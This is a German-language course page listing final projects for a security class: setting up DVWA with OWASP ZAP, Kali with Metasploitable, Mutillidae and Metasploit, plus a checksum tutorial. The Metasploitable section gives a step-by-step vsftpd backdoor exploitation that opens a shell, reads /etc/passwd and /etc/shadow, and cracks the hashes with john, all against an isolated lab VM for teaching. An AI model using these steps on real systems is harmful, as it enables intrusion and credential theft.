# Projekte: SEC

## +Abschlussprojekt: DVWA-OWASP-ZAP
OWASP-ZAP und DVWN

1. Installieren Sie OWASP-ZAP: 
		https://www.owasp.org/index.php/Main_Page
	DVWA:
		http://www.dvwa.co.uk/
	


	

## +Abschlussprojekt: KALI-Metasploitable
Installieren Sie als Virtuelle Maschinen
	1. KALI
	2. Metasploitable-linux-x.x.x.zip

Achten Sie darauf, dass diese von außen nicht erreichbar sind
	HOST-ONLY-ADAPTER

ad: 2. Metasploitable
	Eine Virtuelle Maschine zum Kaputtmachen
	
	http://blog.seibert-media.net/2012/10/24/metasploitable-virtuelle-maschine/
	
	

Vorgehen:
1. Zuerst die Foot-printing-Phase, dann 
2. die Scanning-Phase
3. die Dienste und Apps scannen

Hinweis: BACK-door and get user&passwords
	Es existiert ein ftp backdoor
	telnet 192.168.56.101 21
	user backdoor:)
	pass comein
	
	telnet 192.168.56.101 6200
	ps
	cat /etc/passwd
	cat /etc/shadow

	unshadow passwd shadow > unshadowed.txt
	john unshadowed.txt
	ssh -l msfadmin 192.168.56.101
	





## +Abschlussprojekt: NOWASP - Mutillidae
http://sourceforge.net/projects/mutillidae/
kann mit xampp installiert werden



Siehe auch: interessante Videos
http://www.youtube.com/user/webpwnized





Zusatz: sha1sum, md5sum ... erzeugen und überprüfen
http://www.thomas-krenn.com/de/wiki/Md5sum_und_sha1sum_zum_%C3%9Cberpr%C3%BCfen_von_Dateidownloads_verwenden


sha1sum datei.iso > datei.sh1


benutzer:~/Ordner$ ls
datei.iso  datei.md5

benutzer:~/Ordner$ md5sum datei.iso 
161a1957728be5d530c3fab67ac40652  datei.iso

benutzer:~/Ordner$ cat datei.md5 
161a1957728be5d530c3fab67ac40652  datei.iso

benutzer:~/Ordner$ md5sum -c datei.md5 
datei.iso: OK



## Weitere Zusätze
Metasploit
Gespeichert von Cyber-Labor am Do, 01/31/2013 - 13:02
Aktuelle Scans mit Metasploit der Firma Rapid 7

Millionen Geräte über UPnP angreifbar | Cyber-Labor.de - http://is.gd/Zde6Kg

Die für das Angriffsframework Metasploit bekannte Sicherheitsfirma Rapid7 hat bei einem IP-Scan aller möglichen IPv4-Adressen 40 bis 50 Millionen Netzwerkgeräte entdeckt, die man mit einem einzigen Datenpaket aus der Ferne kompromittieren könnte.




1.)
Installieren Sie das Programm Metasploit 
http://www.metasploit.com/download/

Metasploit ist ein mächtiges Programm, um Sicherheits-Lücken auf 
einzelnen Netzwerk-Maschinen zu finden. 

Sie sollten bereits jetzt das verkürzte Handbuch herunterladen und lesen 
https://community.rapid7.com/docs/DOC-1566


Aufgabe: Metasploit
-------------------
machen Sie sich mit dem Programm vertraut


